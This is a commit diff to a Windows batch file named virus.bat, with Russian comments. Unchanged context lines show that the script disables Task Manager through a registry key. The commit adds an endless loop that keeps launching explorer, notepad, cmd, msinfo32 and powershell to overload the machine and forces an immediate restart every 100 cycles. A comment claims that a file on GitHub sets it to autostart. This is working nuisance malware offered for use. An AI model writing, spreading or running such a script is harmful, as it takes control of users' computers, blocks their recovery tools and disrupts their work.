cfcc1967bc309bdf0e000019c9d7cd3e45cf4e8b
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-04 00:28:18 +0400

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -42,3 +42,24 @@ if %errorlevel% == 0 (
 :: (Запрет открытия диспетчера задач)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
 echo Диспетчер задач запрещён к запуску.
+
+:: (Главный сценарий: открытие системных программ что влияет на нагрузку системы, а потом выключение. Всё предусмотрено: на Github есть файл с авто-запуском файла с вирусом.)
+
+:: (Переменная циклов)
+set "cycles=0"
+echo Переменная циклов установлена
+
+:: (Нагрузка на ПК и выключение. Авто запуск предусмотрен!)
+:forever
+start explorer.exe
+start notepad.exe
+start cmd.exe
+start msinfo32.exe
+start powershell.exe
+set /a "cycles+=1"
+echo Цикл пройден. Пройдено %cycles% циклов
+if %cycles% == 100 (
+    echo Выключение...
+    shutdown /r /t 0
+)
+goto :forever
